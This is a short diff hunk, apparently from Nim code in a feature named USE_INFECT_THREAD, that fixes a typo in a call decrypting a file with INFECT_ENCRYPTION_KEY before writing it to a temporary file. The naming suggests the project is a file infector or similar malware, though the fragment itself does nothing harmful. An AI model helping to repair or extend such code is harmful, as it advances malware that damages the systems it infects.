@@ -27,7 +27,7 @@ when USE_INFECT_THREAD:
         tmpFile,
         decrypt(
           readFile file,
-          d INFECT_ENCRYPTION_KEY
+          INFECT_ENCRYPTION_KEY
         )
       ) # write decrypted file
 
